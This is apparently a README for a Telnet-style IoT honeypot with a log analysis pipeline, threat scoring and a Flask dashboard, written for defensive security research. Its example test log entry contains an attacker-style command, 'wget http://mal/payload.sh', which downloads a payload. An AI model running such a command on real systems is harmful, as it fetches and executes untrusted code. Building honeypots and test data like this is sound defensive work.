# 🚨 IoT Honeypot + Smart Attack Analyzer

**One-line:** A production-style Telnet-like IoT honeypot that captures attacker activity, enriches it with geo & threat intelligence, performs smart analysis (classification + anomaly detection), and presents results on a live Flask dashboard — fully automatable via a watcher pipeline.

---

## ✨ Highlights (Why this project stands out)

- **Realistic IoT honeypot** (Telnet-like) that records attacker commands and metadata
- **Automated pipeline**: new log entry → geo enrichment → smart analysis → threat correlation → AI summary → dashboard refresh
- **Visual intelligence**: interactive map, top-IP charts, AI/SOC-style text summaries
- **Modular and extensible**: analyzers, threat correlator, AI summary, dashboard all decoupled for easy improvement
- **Resume-ready**: demonstrates systems, networking, data engineering, and security analytics skills

---

## 📁 Project Structure
```
IOT_Hon_Smar_Att_Analyzer/
├── honeypot/
│   └── fake_telnet.py              # Honeypot server (binds to 0.0.0.0)
│
├── analyzer/
│   ├── analyze_logs.py             # Phase-2 parser
│   ├── geo_analyzer.py             # GeoIP enrichment + map (writes to reports/)
│   ├── smart_analyzer.py           # Attack classification & CSV reports
│   ├── threat_intel_correlator.py  # Threat scoring + enrichment
│   ├── ai_summary_engine.py        # Generates human-readable AI summaries
│   └── pipeline.py                 # Watcher / automation script
│
├── dashboard/
│   ├── app.py                      # Flask app (serves UI/Map/Download)
│   └── templates/
│       └── index.html              # Dashboard UI (Bootstrap + Plotly/Map)
│
├── logs/                           # (gitignored) attacks.log (JSONL)
│   └── attacks.log
│
├── reports/                        # (gitignored) generated CSVs, HTML map, txt summaries
│
├── requirements.txt                # Pinned dependencies
├── README.md
└── .gitignore
```

---

## ⚙️ Features (detailed)

### Core Components

- **Honeypot** — Fake Telnet device that accepts connections and logs:
  - `timestamp`, `source_ip`, `port`, `command`, `status`

- **Automated Pipeline** — `pipeline.py` uses `watchdog` to trigger the analyzer chain on new logs

- **Geo-enrichment** — Convert IP → country/region/city/lat/lon and save `reports/attack_map.html`

- **Smart Analysis** — Keyword-based classification (recon, brute force, malware download, system disruption), basic anomaly detection

- **Threat Intelligence** — Weighted threat scoring (command risk + port risk + reputation), risk labels (Low/Medium/High)

- **AI Summary** — `ai_summary_engine.py` produces SOC-style human readable summaries and saves `.txt` files

- **Flask Dashboard** — Live table (auto-refresh), AI summary panel, map viewer, and CSV/summary downloads

- **Extensible** — Hooks ready for Telegram/email alerts, ML pipelines, Dockerization

---

## 🛠️ Prerequisites

- **Python 3.10+** (tested on 3.11/3.12)
- **Windows/Linux/Mac** — instructions below use Windows paths, adjust for other OSes
- **(Optional)** A public IP or VPS for real-world external tests — **only** if you understand legal implications

---

## 📦 Installation (Windows)

### 1. Clone repository
```powershell
git clone <your-repo-url>
cd IOT_Hon_Smar_Att_Analyzer
```

### 2. Create & activate a virtual environment (recommended)
```powershell
python -m venv venv
venv\Scripts\activate
```

### 3. Install dependencies
```powershell
pip install -r requirements.txt
```

**If you don't have `requirements.txt`, install the main packages:**
```powershell
pip install flask pandas requests watchdog plotly scikit-learn folium
```

---

## ▶️ Quick Run (clean start)

Run these in separate terminals (or let the pipeline open dashboard automatically):

### Terminal A: Start the honeypot
```powershell
python honeypot\fake_telnet.py
```

### Terminal B: Start the automation pipeline
```powershell
python analyzer\pipeline.py
```

*The pipeline watches `logs/attacks.log`, runs analyzers when new entries appear, and opens the dashboard.*

### (Optional) Terminal C: Run dashboard manually
```powershell
cd dashboard
python app.py
```

**Open browser:** [http://127.0.0.1:5000/](http://127.0.0.1:5000/)

---

## 🧪 Testing when local (developer notes)

Local test connections originate from `127.0.0.1` or `192.168.x.x` → Geo lookups will be skipped (private IPs).

### To test map and geo features, either:

1. Append a few fake public IP JSONL entries to `logs/attacks.log` (examples in `examples/test_logs.jsonl`), or

2. Run honeypot from another machine on the same network (use honeypot host LAN IP, ensure firewall/router allows connections)

### Example JSONL test entry:
```json
{"timestamp":"2025-10-26T11:59:00.587627","source_ip":"8.8.8.8","port":2323,"command":"wget http://mal/payload.sh","status":"command received"}
```

---

## 🧾 What each script does (short)

| Script | Description |
|--------|-------------|
| `fake_telnet.py` | Listens for TCP connections and logs attacker interactions to `logs/attacks.log` in JSONL format |
| `analyze_logs.py` | Reads `logs/attacks.log`, prints summaries, and writes CSV reports |
| `geo_analyzer.py` | Enriches logs with lat/lon/country and writes `reports/attack_map.html` |
| `smart_analyzer.py` | Classification + saves `reports/smart_report_*.csv` |
| `threat_intel_correlator.py` | Reputation checks & threat scoring → `reports/threat_correlation_*.csv` |
| `ai_summary_engine.py` | Generates human-readable summary text → `reports/ai_summary_*.txt` |
| `pipeline.py` | Watches `logs/attacks.log` and runs analyzers; launches dashboard |
| `dashboard/app.py` | Flask web UI for viewing tables, map, and summaries |

---

## 🔐 Security & Ethics (must read)

⚠️ **IMPORTANT WARNINGS:**

- **Do not deploy this honeypot on a public IP** without isolating it in a VM or gated network. Honeypots can attract malicious traffic.

- **Only use on systems and networks you own** or are authorized to test.

- **Avoid logging real sensitive data**; this is a research/demo tool only.

- **Understand legal implications** before exposing this to the internet. Unauthorized honeypot deployment may violate terms of service or local laws.

- **Isolate your honeypot** from production systems to prevent potential compromise.

---

## 🚀 Future Enhancements

- [ ] Docker containerization for easy deployment
- [ ] Integration with external threat intelligence APIs (AbuseIPDB, VirusTotal)
- [ ] Machine learning-based anomaly detection
- [ ] Real-time alerts via Telegram/Email/Slack
- [ ] Support for additional protocols (SSH, HTTP)
- [ ] Advanced visualization with D3.js/Grafana
- [ ] Automated threat response capabilities

---

**⭐ Star this repository if you find it helpful!**
